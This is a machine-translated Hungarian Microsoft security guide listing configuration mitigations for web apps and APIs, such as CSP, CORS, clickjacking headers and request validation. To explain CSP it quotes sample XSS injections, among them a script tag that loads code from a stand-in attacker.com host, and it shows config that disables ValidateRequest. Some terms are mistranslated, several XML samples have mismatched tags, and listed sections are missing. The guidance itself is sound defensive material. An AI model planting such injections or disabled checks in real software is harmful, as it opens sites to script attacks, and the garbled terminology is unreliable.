---
title: Configuration Management – Microsoft Fenyegetésmodellezési eszköz – Azure |} A Microsoft Docs
description: megoldások a fenyegetések között szerepelnek a Threat Modeling Tool
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.openlocfilehash: b24d32afed5acfd846f9a8e8316339665524ad2e
ms.sourcegitcommit: 11d8ce8cd720a1ec6ca130e118489c6459e04114
ms.translationtype: MT
ms.contentlocale: hu-HU
ms.lasthandoff: 12/04/2018
ms.locfileid: "52849766"
---
# <a name="security-frame-configuration-management--mitigations"></a>Biztonsági keret: Konfigurációkezelés |} Megoldások 
| Termék vagy szolgáltatás | Cikk |
| --------------- | ------- |
| **Webalkalmazás** | <ul><li>[Tartalmak biztonsági szabályzat (CSP) megvalósítása, és beágyazott javascript letiltása](#csp-js)</li><li>[Böngésző XSS szűrő engedélyezése](#xss-filter)</li><li>[Az ASP.NET-alkalmazások le kell tiltania az nyomkövetéséhez és üzembe helyezés előtt](#trace-deploy)</li><li>[Hozzáférés külső JavaScript-kódok csak megbízható forrásból származó](#js-trusted)</li><li>[Győződjön meg arról, hogy hitelesített ASP.NET-lapok építhet be felhasználói felület Redressing, vagy kattintson az emelési védelem](#ui-defenses)</li><li>[Győződjön meg arról, hogy csak megbízható források engedélyezettek, ha a CORS engedélyezve van az ASP.NET-webalkalmazások](#cors-aspnet)</li><li>[Az ASP.NET-lapok ValidateRequest attribútum engedélyezése](#validate-aspnet)</li><li>[JavaScript-könyvtárak legújabb verzióit helyileg üzemeltetett használata](#local-js)</li><li>[Automatikus elemzés MIME letiltása](#mime-sniff)</li><li>[Távolítsa el a Windows Azure webhelyek ujjlenyomat elkerülése érdekében a szabványos server fejlécek](#standard-finger)</li></ul> |
| **Adatbázis** | <ul><li>[A Windows tűzfal konfigurálása a hozzáféréshez](#firewall-db)</li></ul> |
| **Webes API** | <ul><li>[Győződjön meg arról, hogy csak megbízható források engedélyezettek, ha a CORS engedélyezve van az ASP.NET Web API](#cors-api)</li><li>[Webes API a konfigurációs fájlok bizalmas adatokat tartalmazó szakaszok titkosítása](#config-sensitive)</li></ul> |
| **IoT-eszköz** | <ul><li>[Győződjön meg arról, hogy az összes felügyeleti felületeiről biztosított erős hitelesítő adatokkal](#admin-strong)</li><li>[Győződjön meg arról, hogy ismeretlen kód nem hajtható végre, az eszközökön](#unknown-exe)</li><li>[Az operációs rendszer és az AppLocker-bites az IoT-eszközök további partíciók titkosítása](#partition-iot)</li><li>[Győződjön meg arról, hogy csak a minimális szolgáltatásokat és funkciókat engedélyezve vannak-e az eszközökön](#min-enable)</li></ul> |
| **IoT helyszíni átjáró** | <ul><li>[Az operációs rendszer és az AppLocker-bites mező IoT-átjáró további partíciók titkosítása](#field-bit-locker)</li><li>[Győződjön meg arról, hogy az alapértelmezett bejelentkezési hitelesítő adatokat a helyszíni átjáró az módosítják a telepítés során](#default-change)</li></ul> |
| **IoT átjáró** | <ul><li>[Győződjön meg arról, hogy a Felhőátjáró valósít meg egy folyamatot, hogy a csatlakoztatott eszközök belső vezérlőprogramjának naprakészen tartása](#cloud-firmware)</li></ul> |
| **Gép megbízhatósági kapcsolat határán** | <ul><li>[Győződjön meg arról, hogy eszközök rendelkeznek-e a szervezeti szabályzatok szerint konfigurált végponti biztonsági vezérlőket](#controls-policies)</li></ul> |
| **Azure Storage** | <ul><li>[Győződjön meg, hogy az Azure storage hozzáférési kulcsok biztonságos felügyeletéhez](#secure-keys)</li><li>[Győződjön meg arról, hogy csak megbízható források engedélyezettek, ha a CORS engedélyezve van az Azure storage](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[A szolgáltatás szabályozása a WCF szolgáltatás engedélyezése](#throttling)</li><li>[WCF-adatokhoz való illetéktelen hozzáférés, metaadatok keresztül](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>Tartalmak biztonsági szabályzat (CSP) megvalósítása, és beágyazott javascript letiltása

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Web Application | 
| **SDL fázis**               | Felépítés |  
| **Megfelelő technológiák** | Általános |
| **Attribútumok**              | –  |
| **Hivatkozások**              | [Tartalmak biztonsági házirend bemutató](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [tartalom biztonsági házirend-referencia](http://content-security-policy.com/), [biztonsági funkciók](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [tartalom biztonsági házirend bemutatása](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) , [Használható CSP?](http://caniuse.com/#feat=contentsecuritypolicy) |
| **Lépések** | <p>Tartalom biztonsági szabályzat (CSP) egy defense jellegű biztonsági mechanizmust, egy W3C szabvány, amely lehetővé teszi az alkalmazástulajdonosok webes ellenőrzése a helyükön a beágyazott tartalmat. CSP egészül ki egy HTTP-válaszfejléc a webkiszolgálón, és kikényszeríti a ügyféloldali böngészőkben. Ez egy olyan engedélyezési lista-alapú szabályzat - webhely deklarálhatnak mely aktív tartalomból megbízható tartományok készlete, például a JavaScript tölthetők be.</p><p>Kriptográfiai Szolgáltató a következő biztonsági előnyöket nyújtja:</p><ul><li>**XSS elleni védelem:** egy lapot ki téve a XSS, ha egy támadó kihasználhatja, 2 módon:<ul><li>Beszúrása `<script>malicious code</script>`. A biztonsági rés kiaknázása elleni nem fog működni a korlátozás-1-miatt a Felhőszolgáltató alapja</li><li>Beszúrása `<script src=”http://attacker.com/maliciousCode.js”/>`. A biztonsági rés kiaknázása elleni nem fog működni, mivel a támadó ellenőrzött tartomány nem lesz a Felhőszolgáltató engedélyezett a tartományok</li></ul></li><li>**Adatok kiszűrése szabályozhatja:** Ha bármely kártevő tartalmát egy weblap csatlakozik egy külső webhelyre, és adatokat ellopni próbál, a kapcsolat megszakad a CSP által. Ennek oka, hogy a célként megadott tartomány nem lesz a Felhőszolgáltató engedélyezési listán szereplő</li><li>**Kattintson az-emelési elleni védelmet:** kattintson-emelési egy támadási módszer használatával melyik egy támadó egy valódi webhely és a kényszerített felhasználók kattintson a felhasználói felületi elemeket is keretet. Kattintson az-emelési elleni védelmet jelenleg egy válasz fejléce-X-keret-beállítások konfigurálásával érhető el. A böngészők nem veszik figyelembe ezt a fejlécet, és előre CSP fog kattintson-emelési védekezhessen szabványos módon lesz</li><li>**Valós idejű támadási reporting:** egy CSP-engedélyezett webhely injektálás elleni támadás esetén böngészők automatikusan elindítják-egy a webkiszolgáló konfigurált végpontnak. Ezzel a módszerrel CSP figyelmeztető valós idejű rendszer szolgál.</li></ul> |

### <a name="example"></a>Példa
A példában a házirend: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Ez a szabályzat lehetővé teszi a parancsfájlok csak az a webalkalmazás kiszolgáló és a google analytics-kiszolgálóhoz való betöltésére. Bármely más helyről betöltött szkriptek a rendszer elutasítja. CSP engedélyezve van a webhely, amikor a program automatikusan letiltja a következő funkciókat a XSS-támadások számának csökkentése érdekében. 

### <a name="example"></a>Példa
Beágyazott parancsfájlokra nem megy végbe. Az alábbiakban beágyazott parancsfájlokra példái 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>Példa
Karakterláncok kódként nem lesz kiértékelve. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>Böngésző XSS szűrő engedélyezése

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Web Application | 
| **SDL fázis**               | Felépítés |  
| **Megfelelő technológiák** | Általános |
| **Attribútumok**              | –  |
| **Hivatkozások**              | [XSS védelmi szűrő](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **Lépések** | <p>Válasz X-XSS-védelmi konfiguráció a böngészőben webhelyek közötti parancsfájl szűrő szabályozza. A válasz fejléce veheti fel a következő értékeket:</p><ul><li>`0:` Ezzel a lépéssel letiltja a szűrő</li><li>`1: Filter enabled` A többhelyes parancsfájl-kezelési támadások észlelése esetén annak érdekében, hogy a támadást, állítsa le a böngészőben fog megtisztítása az oldal</li><li>`1: mode=block : Filter enabled`. Inkább a XSS-támadások észlelése esetén az oldal vírusmentesítsen, mint a böngésző megakadályozza, hogy az oldal megjelenítési</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. A böngészőben az oldal megtisztítása, és a jelentést a megsértése.</li></ul><p>Ez a CSP megsértése jelentések részletei küldése tetszőleges URI használatával króm függvény. A legutóbbi 2 beállítások biztonságos értékek számítanak.</p>|

## <a id="trace-deploy"></a>Az ASP.NET-alkalmazások le kell tiltania az nyomkövetéséhez és üzembe helyezés előtt

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Web Application | 
| **SDL fázis**               | Felépítés |  
| **Megfelelő technológiák** | Általános |
| **Attribútumok**              | –  |
| **Hivatkozások**              | [ASP.NET – áttekintés hibakeresés](http://msdn2.microsoft.com/library/ms227556.aspx), [követés áttekintése ASP.NET](http://msdn2.microsoft.com/library/bb386420.aspx), [hogyan: enable Tracing for ASP.NET-alkalmazás engedélyezése](http://msdn2.microsoft.com/library/0x5wc973.aspx), [hogyan: az ASP.NET-alkalmazások hibakeresés engedélyezése](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Lépések** | Amikor nyomkövetés engedélyezve van minden böngésző is szerzi be a nyomkövetési adatok belső állapot és a munkafolyamat adatait tartalmazó kérő lapon. Ezt az információt lehet a biztonság-és nagybetűket. Hibakeresés engedélyezve van a lapon, ha hiba történik az a kiszolgáló egy teljes verem nyomkövetési adatok számára a böngészőben megjelenő eredményez. Az adatokat a kiszolgálói munkafolyamat biztonsági szempontból kényes információt tehetik közzé. |

## <a id="js-trusted"></a>Hozzáférés külső JavaScript-kódok csak megbízható forrásból származó

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Web Application | 
| **SDL fázis**               | Felépítés |  
| **Megfelelő technológiák** | Általános |
| **Attribútumok**              | –  |
| **Hivatkozások**              | –  |
| **Lépések** | külső JavaScript-kódok csak megbízható forrásból kell lehet hivatkozni. A referencia-végpontok mindig az SSL-lel kell lennie. |

## <a id="ui-defenses"></a>Győződjön meg arról, hogy hitelesített ASP.NET-lapok építhet be felhasználói felület Redressing, vagy kattintson az emelési védelem

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Web Application | 
| **SDL fázis**               | Felépítés |  
| **Megfelelő technológiák** | Általános |
| **Attribútumok**              | –  |
| **Hivatkozások**              | [Kattintson-emelési Defense Adatlap lap OWASP](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [IE Internals - elleni küzdelemben kattintson-emelési az X-keret-beállítások](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
| **Lépések** | <p>emelési, kattintson más néven a "felhasználói felület jogorvoslati támadások", akkor, ha egy támadó használ több transzparens vagy átlátszatlan réteg felhasználót: egy felhasználó egy gombra kattintva, vagy egy másik lapon lévő hivatkozásra, ha azok is kívánó a legfelső szintű oldalon kattintson.</p><p>Ez a réteges felépítés létrehozásával egy rosszindulatú lap IFRAME, amely betölti az áldozat lapon érhető el. Ebből kifolyólag a támadó "térít el" webszolgáltatásokban a lap, és az Útválasztás őket egy másik lapot, valószínűleg egy másik alkalmazást, tartomány vagy mindkettő által birtokolt kattintással. Kattintson az-emelési támadások megelőzése érdekében állítsa be a megfelelő X-keret-Options HTTP-válaszfejlécek, melyek arra utasítják a böngészőt, hogy engedélyezi a más tartományokból keretező</p>|

### <a name="example"></a>Példa
Az X-keret-OPTIONS fejlécben IIS web.config keresztül állítható be. A kódrészlet Web.config soha nem kell megalkotni helyekhez: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Példa
Web.config kódot, amely ugyanabban a tartományban lapok csak kell Keretes helyek: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>Győződjön meg arról, hogy csak megbízható források engedélyezettek, ha a CORS engedélyezve van az ASP.NET-webalkalmazások

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Web Application | 
| **SDL fázis**               | Felépítés |  
| **Megfelelő technológiák** | Web Forms MVC5 |
| **Attribútumok**              | –  |
| **Hivatkozások**              | –  |
| **Lépések** | <p>A böngésző biztonsági beállításai megakadályozzák, hogy egy weblap AJAX-kérelmeket küldjön egy másik tartományba. Ez a korlátozás az azonos eredethez szabályzat neve, és megakadályozza, hogy egy rosszindulatú webhely érzékeny adatok olvasása a másik helyről. Azonban néha lehet szükséges API-k biztonságos elérhetővé más webhelyeket használhatnak fel. Keresztszűrés eredetű erőforrások megosztása (CORS) egy W3C szabvány, amely lehetővé teszi a kiszolgáló a azonoseredet-enyhítése. A CORS használatával, egy kiszolgáló kifejezetten engedélyezhet bizonyos néhány eltérő eredetű kérések elutasítása mellett más.</p><p>A CORS biztonságosabb és rugalmasabb, mint a korábbi technikák, például JSNOP. A hozzá tartozó fő a CORS engedélyezése a rendszer lefordítja arra néhány HTTP-válaszfejlécek hozzáadása (hozzáférés - vezérlés – *) a webes alkalmazás, és ez végezhető, többféle módon.</p>|

### <a name="example"></a>Példa
Ha Web.config érhető el, majd CORS segítségével is hozzáadhat a következő kódot: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="http://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Példa
Ha web.config való hozzáférés nem érhető el, majd CORS konfigurálhatók adja hozzá a következő CSharp-kódot: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
```

Vegye figyelembe, hogy rendkívül fontos győződjön meg arról, hogy a lista azokat az eredeteket tartalmazza az "Access-Control-Allow-Origin" attribútum értéke eredetek véges, és megbízható készletét. Konfigurálhatja ezt nem megfelelően működik (pl. érték szerint "*") lehetővé teszi a rosszindulatú webhelyeket eredetű kérések a webes alkalmazásba való indításához >, korlátozás nélkül ezáltal az alkalmazás CSRF támadásokkal szemben sebezhető. 

## <a id="validate-aspnet"></a>Az ASP.NET-lapok ValidateRequest attribútum engedélyezése

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Web Application | 
| **SDL fázis**               | Felépítés |  
| **Megfelelő technológiák** | Web Forms MVC5 |
| **Attribútumok**              | –  |
| **Hivatkozások**              | [Ellenőrzés - parancsfájl támadások kérése](http://www.asp.net/whitepapers/request-validation) |
| **Lépések** | <p>Ellenőrizni a kéréseket, a szolgáltatás az ASP.NET 1.1-es verziója óta megakadályozza, hogy a kiszolgáló fogadja a tartalom tartalmazó nem kódolt HTML. Ez a funkció célja, amellyel ügyfél-szkriptkódot, vagy a HTML-tudtukon elküldve a kiszolgáló, tárolásának, és ezután más felhasználók számára megjelenő a parancsfájl-injektálási támadások megelőzése érdekében. Továbbra is javasoljuk, hogy az összes bemeneti adatok érvényesítése és HTML kódolása, ha szükséges.</p><p>Kérelem érvényesítése potenciálisan veszélyes értékekből álló listát az összes bemeneti adatot összevetésével történik. Egyezés esetén az ASP.NET kivált egy `HttpRequestValidationException`. Ellenőrzés kérése a szolgáltatás alapértelmezés szerint engedélyezve van.</p>|

### <a name="example"></a>Példa
Ez a funkció azonban lap szintjén letiltható: 
```XML
<%@ Page validateRequest="false" %> 
```
vagy alkalmazás szinten 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Vegye figyelembe, hogy az ellenőrzési kérés funkció nem támogatott, és nem MVC6 folyamat részeként. 

## <a id="local-js"></a>JavaScript-könyvtárak legújabb verzióit helyileg üzemeltetett használata

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Web Application | 
| **SDL fázis**               | Felépítés |  
| **Megfelelő technológiák** | Általános |
| **Attribútumok**              | –  |
| **Hivatkozások**              | –  |
| **Lépések** | <p>Standard JavaScript-könyvtárak, JQuery kell használnia segítségével a fejlesztők jóváhagyott JavaScript kódtárak, amelyek nem rendelkeznek ismert biztonsági hibára derült verzióit. Bevált gyakorlat, hogy a kódtárak legtöbb legújabb verzióját használja, mivel az ismert biztonsági rések felderítéséhez, a régebbi verziókban biztonsági javításokat tartalmazzák.</p><p>Ha a legutóbbi kiadás nem használható miatt kompatibilitás érdekében az alábbi minimális verziók kell használni.</p><p>Elfogadható minimális verziója:</p><ul><li>**JQuery**<ul><li>1.7.1 JQuery</li><li>JQueryUI 1.10.0</li><li>JQuery 1.9 ellenőrzése</li><li>JQuery Mobile 1.0.1</li><li>2.99 JQuery ciklus</li><li>JQuery DataTables 1.9.0-s</li></ul></li><li>**AJAX-vezérlőelem eszközkészlet**<ul><li>AJAX-vezérlőelem eszközkészlet 40412</li></ul></li><li>**Az ASP.NET Web Forms- és Ajax**<ul><li>Az ASP.NET Web Forms- és Ajax 4</li><li>Az ASP.NET Ajax 3.5.</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Soha nem minden JavaScript-kódtár betöltése külső helyeket, például a nyilvános CDN</p>|

## <a id="mime-sniff"></a>Automatikus elemzés MIME letiltása

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Web Application | 
| **SDL fázis**               | Felépítés |  
| **Megfelelő technológiák** | Általános |
| **Attribútumok**              | –  |
| **Hivatkozások**              | [IE8 biztonsági rész V: átfogó védelem](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME-típus](http://en.wikipedia.org/wiki/Mime_type) |
| **Lépések** | Az X-tartalom-típus-Options fejlécben egy HTTP-fejlécet, amely lehetővé teszi a fejlesztők számára, hogy adja meg, hogy a tartalom nem lehet MIME-felszippantásra. Ez a fejléc célja MIME-elemző támadások számának csökkentése érdekében. Az egyes lapok tartalmazhatnak a felhasználó ellenőrizhető tartalmat, a HTTP-fejléc X kell használnia-tartalom-típus-beállítások: nosniff. Ahhoz, hogy a szükséges fejlécének globálisan az alkalmazás összes oldalán, teheti az alábbi lehetőségek közül|

### <a name="example"></a>Példa
A fejléc hozzáadása a web.config fájlban, ha az alkalmazás által az Internet Information Services (IIS) 7 és újabb verziók esetében. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Példa
A globális alkalmazáson keresztül a fejléc hozzáadása\_BeginRequest 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Példa
Egyéni HTTP-modulja megvalósítása 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Példa
Csak egyes oldalakat szükséges fejléce egyes válaszok való hozzáadással engedélyezheti: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Távolítsa el a Windows Azure webhelyek ujjlenyomat elkerülése érdekében a szabványos server fejlécek

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Web Application | 
| **SDL fázis**               | Felépítés |  
| **Megfelelő technológiák** | Általános |
| **Attribútumok**              | EnvironmentType – Azure |
| **Hivatkozások**              | [A Windows Azure webhelyek standard szintű kiszolgáló fejlécek eltávolítása](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Lépések** | Például a kiszolgáló, X-alapú-szerint, X-AspNet-Version fejlécek felfedése információ a kiszolgáló és a mögöttes technológiákat. Javasoljuk, hogy ezáltal ezek a fejlécek elrejtése megakadályozza, hogy az alkalmazás-ujjlenyomat |

## <a id="firewall-db"></a>A Windows tűzfal konfigurálása a hozzáféréshez

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Adatbázis | 
| **SDL fázis**               | Felépítés |  
| **Megfelelő technológiák** | SQL Azure, OnPrem |
| **Attribútumok**              | N/A, SQL-verzió - 12-es verzió |
| **Hivatkozások**              | [Az Azure SQL database-tűzfalak konfigurálása](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [hozzáféréshez a Windows tűzfal konfigurálása](https://msdn.microsoft.com/library/ms175043) |
| **Lépések** | Tűzfalrendszerekről a számítógép-erőforrásokra való illetéktelen hozzáférés megakadályozása érdekében. Egy a tűzfalon keresztül hozzáférjen az SQL Server adatbázismotor példánya, konfigurálnia kell a tűzfal engedélyezi a hozzáférést az SQL Servert futtató számítógépen |

## <a id="cors-api"></a>Győződjön meg arról, hogy csak megbízható források engedélyezettek, ha a CORS engedélyezve van az ASP.NET Web API

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webes API | 
| **SDL fázis**               | Felépítés |  
| **Megfelelő technológiák** | MVC 5 |
| **Attribútumok**              | –  |
| **Hivatkozások**              | [Az ASP.NET Web API 2 eltérő eredetű kérések engedélyezése](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET webes API - CORS-támogatás az ASP.NET Web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Lépések** | <p>A böngésző biztonsági beállításai megakadályozzák, hogy egy weblap AJAX-kérelmeket küldjön egy másik tartományba. Ez a korlátozás az azonos eredethez szabályzat neve, és megakadályozza, hogy egy rosszindulatú webhely érzékeny adatok olvasása a másik helyről. Azonban néha lehet szükséges API-k biztonságos elérhetővé más webhelyeket használhatnak fel. Keresztszűrés eredetű erőforrások megosztása (CORS) egy W3C szabvány, amely lehetővé teszi a kiszolgáló a azonoseredet-enyhítése.</p><p>A CORS használatával, egy kiszolgáló kifejezetten engedélyezhet bizonyos néhány eltérő eredetű kérések elutasítása mellett más. A CORS biztonságosabb és rugalmasabb, mint a korábbi technikák, például JSNOP.</p>|

### <a name="example"></a>Példa
Az App_Start/WebApiConfig.cs adja hozzá az alábbi kód WebApiConfig.Register metódushoz 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Példa
EnableCors attribútum alkalmazhatók műveletmetódusokhoz egy vezérlőt a következőképpen: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Vegye figyelembe, hogy rendkívül fontos arról, hogy EnableCors attribútumban források listáját eredetek véges, és megbízható csoportja van beállítva. Konfigurálhatja ezt nem megfelelően működik (például érték mint "*") lehetővé teszi a rosszindulatú webhelyeket eredetű kérések az API-hoz, korlátozás nélkül aktiválhat > ezáltal CSRF támadásokkal szemben sebezhető az API-t. EnableCors vezérlő szintjén is kell rendelkeznie. 

### <a name="example"></a>Példa
Egy adott metódus az osztály a CORS letiltásához a DisableCors attribútum is használható alább látható módon: 
```csharp
[EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webes API | 
| **SDL fázis**               | Felépítés |  
| **Megfelelő technológiák** | MVC 6 |
| **Attribútumok**              | –  |
| **Hivatkozások**              | [Eltérő eredetű kérelmek (CORS) az ASP.NET Core 1.0-s engedélyezése](https://docs.asp.net/en/latest/security/cors.html) |
| **Lépések** | <p>ASP.NET Core 1.0-s verziójában a CORS engedélyezhető a közbenső szoftverrel vagy MVC használatával. MVC használata a CORS engedélyezése esetén az azonos CORS-szolgáltatásokat használja, de a CORS közbenső nem.</p>|

**1. módszer** CORS engedélyezése a közbenső szoftver: ahhoz, hogy a teljes alkalmazást a CORS a CORS közbenső szoftver hozzáadása a kérelem folyamat UseCors bővítmény mód használatával. A CORS közbenső a CorsPolicyBuilder osztállyal való hozzáadásakor egy eltérő eredetű házirend adható meg. Ehhez két módja van:

### <a name="example"></a>Példa
Az első, hogy egy lambda UseCors hívja meg. A lambda-CorsPolicyBuilder objektum fogadja: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("http://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Példa
A második, hogy egy vagy több megnevezett CORS szabályzatokat határozhat meg, és válassza ki a szabályzat neve szerint futási időben. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("http://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Megközelítés-2** az mvc-ben a CORS engedélyezése: a fejlesztők azt is megteheti a MVC adott CORS műveletenként vezérlő, vagy globálisan minden tartományvezérlőn a alkalmazni.

### <a name="example"></a>Példa
Műveletenként: Adja meg a CORS egy bizonyos művelet szabályzatának adja hozzá a [EnableCors] attribútumot a műveletre. Adja meg a szabályzat nevét. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Példa
Egy tartományvezérlő: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Példa
Globálisan: 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Vegye figyelembe, hogy rendkívül fontos arról, hogy EnableCors attribútumban források listáját eredetek véges, és megbízható csoportja van beállítva. Konfigurálhatja ezt nem megfelelően működik (például érték mint "*") lehetővé teszi a rosszindulatú webhelyeket eredetű kérések az API-hoz, korlátozás nélkül aktiválhat > ezáltal CSRF támadásokkal szemben sebezhető az API-t. 

### <a name="example"></a>Példa
A CORS egy vezérlő vagy a művelet letiltásához használja a [DisableCors] attribútum. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>Webes API a konfigurációs fájlok bizalmas adatokat tartalmazó szakaszok titkosítása

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webes API | 
| **SDL fázis**               | Környezet |  
| **Megfelelő technológiák** | Általános |
| **Attribútumok**              | –  |
| **Hivatkozások**              | [Útmutató: Az ASP.NET 2.0 használatával DPAPI konfigurációs szakaszokat titkosítása](https://msdn.microsoft.com/library/ff647398.aspx), [adjon meg egy védett Konfigurációszolgáltató](https://msdn.microsoft.com/library/68ze1hb2.aspx), [Azure Key Vault használatával az alkalmazás titkainak védelmére](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Lépések** | Konfigurációs fájlok, például a Web.config fájlként appsettings.json gyakran használják bizalmas adatokat, köztük a felhasználónevek, jelszavak, adatbázis-kapcsolati karakterláncok és titkosítási kulcsok tárolásához. Ha ezt az információt nem védi, az alkalmazás kitéve a támadók vagy rosszindulatú felhasználók például fiók felhasználóneveket és jelszavakat, adatbázisnevek és kiszolgálók nevei bizalmas információk beszerzése. A központi telepítési típus (az azure és helyszíni) alapján, a titkosítást a DPAPI-t vagy a szolgáltatások, például az Azure Key Vault használatával a konfigurációs fájlok bizalmas szakaszait. |

